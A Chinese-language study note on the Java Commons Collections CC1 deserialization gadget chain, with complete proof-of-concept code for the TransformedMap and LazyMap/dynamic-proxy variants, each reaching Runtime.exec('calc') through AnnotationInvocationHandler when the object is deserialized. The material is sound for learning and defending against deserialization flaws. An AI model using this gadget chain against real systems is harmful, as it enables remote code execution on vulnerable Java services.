知识点来自P牛《Java安全摘要》反序列化部分

# Commons Collections

Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。

Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。

Commons Collections以下简称CC。

这条gadget的核心在于AnnotationInvocationHandler这个类，我们可以查看它的readObject方法：

我们把注意来放到第361行开始，这里的setValue会得到的memberVlues(即反序列化后得到的Map)进行写入元素的操作，请大家记住这一点。

我们把思绪拉回到第二个标题中所讲的前置知识那里，我们先来构造一个被恶意代码所修饰的Map（这里用到了反射相关的知识，如果不了解反射建议先去学习反射的知识点）：

package ysoserial.MyExp.Test;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
            // 包装对象
            new ConstantTransformer(Runtime.class),
            // 对应Runtime.getRuntime()
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{
                "getRuntime",
                null,
            }),
            // 执行Runtime.getRuntime()
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{
                null,
                null,
            }),
            // 执行Runtime.gerRuntime().exec("calc")
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{
                "calc"
            }),
        };
        // 恶意的chainedTransformer
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap();
        Map decorate = TransformedMap.decorate(hashMap, chainedTransformer, chainedTransformer);

        // 触发回调
        decorate.put("key", "value");
    }
}

向被装饰的Map中添加元素就会触发构造好的chainedTransformer#transform，然后获取到当前环境的Runtime对象，通过反射执行exec("calc")，但是在上面的例子中，我们是通过手动添加元素来触发回调的。

这时候我们再来看AnnotationInvocationHandler这个类，经过上面的分析，我们可以知道它的readObject方法会向反序列化得到的Map中执行写入操作，那么如果我们向它传入一个用装饰器装饰好的恶意Map，在反序列化进行写入操作时就会执行我们构造的回调函数。

package ysoserial.MyExp.CCExp;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception {
        // Class<Runtime> runtimeClass = Runtime.class;
        // Method getRuntime = runtimeClass.getMethod("getRuntime");
        // Runtime invoke = (Runtime) getRuntime.invoke(null);
        // invoke.exec("calc");

        Transformer[] transformers = new Transformer[]{
            // 包装对象
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{
                "getRuntime",
                null,
            }),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{
                null,
                null,
            }),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{
                "calc"
            }),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        map.put("value", "xxxx");
        Map decorate = TransformedMap.decorate(map, null, chainedTransformer);


        // 'sun.reflect.annotation.AnnotationInvocationHandler' 在 'sun.reflect.annotation' 中不为 public。
        // 我们不能直接创建对象，需要利用反射获得对象
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Retention.class, decorate);


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(o);
        objectOutputStream.close();
        System.out.println(byteArrayOutputStream);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}

# 几个注意点

# 为什么要用反射的方式获得Runtime

Java中并不是所有对象都支持序列化，待序列化的对象和它的内部属性对象，都必须实现java.io.Serializable接口才可以进行序列化，所以我们如果直接构造下面的chainedTransformer是无法序列化成功的：

Transformer[] transformers = new Transformer[] {
	new ConstantTransformer(Runtime.getRuntime()),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{
		"calc"
		}),
	};

# LazyMap

LazyMap也是对Map的一种修饰,与TransformedMap不同的是:

  • TransformedMap是处理Map中的键或值的时候进行回调
  • LazyMap是Map调用get方法的时候触发回调

# 动态代理

Java中的动态代理可以实现类似于php中的__call魔术方法的功能,当被代理的对象调用任何方法的时候都会触发代理类的invoke方法,我们可以看一下面这个简单的例子

import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) {
        ExampleInvocationHandler exampleInvocationHandler = new ExampleInvocationHandler(new HashMap());
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, exampleInvocationHandler);
        // 动态代理之后只要执行任意方法都会触发invoke方法
        System.out.println(proxyMap.put("hello", "world"));
    }
}

public class ExampleInvocationHandler implements InvocationHandler {
    protected Map map;

    public ExampleInvocationHandler(Map map) {
        this.map = map;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().compareTo("put") == 0) {
            System.out.println("map调用了put方法");
            System.out.println(proxy);
            System.out.println(method);
            System.out.println(Arrays.toString(args));

        return "动态代理";
    }
}

# 构造gadget

环境配置

  • jdk1.7
  • maven依赖：commons-collections3.1

之前说过,yso中的利用了LazyMap来对Map进行修饰,所以现在的关键点就在于如何触发被修饰的Map对象的get方法,从而触发ChainedTransformer中的一系列回调?

关键点在AnnotationInvocationHandler这个类的invoke方法中:

memberValues是反序列化后得到的Map,这里调用了一次get方法,但是如何调用invoke方法呢?

yso的作者利用了一个很巧妙的方法,可以注意到AnnotationInvocationHandler这个类是实现了InvocationHandler接口的:

也就是说,AnnotationInvocationHandler这个类可以作为代理类来使用,所以我们可以构造一个恶意的(用LazyMap装饰过后的)Map,然后对AnnotationInvocationHandler这个类的对象进行初始化,然后作为代理类来代理一个Map,然后把代理后的Map再初始化给一个AnnotationInvocationHandler对象,在反序列化的时候就会触发代理Map的方法,这时候就会进入代理类的invoke方法,最后调用了恶意Map的get方法:

package ysoserial.MyExp.CCExp;

import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1LazyMap {
    public static void main(String[] args) throws Exception {
//        Class<Runtime> runtimeClass = Runtime.class;
//        Method getRuntime = runtimeClass.getMethod("getRuntime");
//        Runtime invoke = (Runtime) getRuntime.invoke(null);
//        invoke.exec("calc");
        org.apache.commons.collections.Transformer[] transformers = new org.apache.commons.collections.Transformer[]{
            // 包装对象
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{
                "getRuntime",
                null,
            }),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{
                null,
                null,
            }),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{
                "calc"
            }),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        // LazyMap#decorate的返回类型是Map
        // LazyMap实现了Map接口并且重写了Map#get方法，所以才会触发回调
        Map decorate = LazyMap.decorate(map, chainedTransformer);

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler o = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);

        // 动态代理
        Map map1 = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, o);
        // 动态代理之后，执行map1的任意方法都会弹出calc
        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, map1);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(handler);
        objectOutputStream.close();
        System.out.println(byteArrayOutputStream);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        Object o1 = objectInputStream.readObject();

    }
}
